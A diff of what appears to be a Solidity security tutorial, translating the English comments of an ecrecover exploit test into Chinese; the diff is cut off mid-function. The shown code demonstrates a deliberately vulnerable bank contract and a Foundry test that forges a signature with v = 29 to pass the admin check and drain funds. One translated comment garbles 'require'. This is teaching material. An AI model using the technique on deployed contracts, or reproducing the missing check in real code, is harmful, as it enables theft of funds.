@@ -51,8 +51,8 @@ contract SimpleBank {
 
         address signer = recoverSignerAddress(_hash, _v, _r, _s);
         console.log("signer", signer);
-        //Mitigation
-        //require(signer != address(0), "Invalid signature");
+        //解决办法
+        //请求函数(signer != address(0), "Invalid signature");
         require(signer == Admin, "Invalid signature");
 
         balances[_to] += _amount;
@@ -62,38 +62,38 @@ contract SimpleBank {
 
 ***\*测试方法:\****
 
-仿真测试--contracts src/test/***\*ecrecover.sol\**** -vvvv
+forge test--contracts src/test/***\*ecrecover.sol\**** -vvvv
 
 ```jsx
-// Function to test a ecRecover vulnerability
+// 测试 ecRecover 漏洞的函数
     function testecRecover() public {
-        // Emits a log with the balance of the current contract before exploitation
+        // 在利用之前发出包含当前合约余额的日志
         emit log_named_decimal_uint(
             "Before exploiting, my balance",
             SimpleBankContract.getBalance(address(this)),
             18
         );
 
-        // Generates a message hash
+        // 生成消息哈希
         bytes32 _hash = keccak256(
             abi.encodePacked("\\x19Ethereum Signed Message:\\n32")
         );
 
-        // Signs the generated hash using vm.sign function. Here, 1 represents the account index
-        // The returned variables r and s are part of the ECDSA signature (Elliptic Curve Digital Signature Algorithm)
+        // 使用 vm.sign 函数对生成的哈希进行签名。 这里，1代表账户索引
+         // 返回的变量r和s是ECDSA签名（椭圆曲线数字签名算法）的一部分
         (, bytes32 r, bytes32 s) = vm.sign(1, _hash);
 
-        // Sets the v variable to 29
-        // Typically in Ethereum, v is 27 or 28. When v is neither 27 nor 28, 
-        // the ecrecover function used for signature validation will return address(0)
+        // 将 v 变量设置为 29
+         // 通常在以太坊中，v 是 27 或 28。当 v 既不是 27 也不是 28 时，
+         // 用于签名验证的ecrecover函数将返回address(0)
         uint8 v = 29;
 
-        // Calls the transfer function of the SimpleBankContract with an incorrect v value
-        // If SimpleBankContract does not correctly validate the v value of the signature,
-        // this could lead to an unauthorized transfer
+        // 使用不正确的 v 值调用 SimpleBankContract 的传输函数
+         // 如果 SimpleBankContract 没有正确验证签名的 v 值，
+         // 这可能会导致未经授权的传输
         SimpleBankContract.transfer(address(this), 1 ether, _hash, v, r, s);
 
-        // Emits a log with the balance of the current contract after the exploit
+        // 漏洞利用后发出包含当前合约余额的日志
         emit log_named_decimal_uint(
             "After exploiting, my balance",
             SimpleBankContract.getBalance(address(this)),
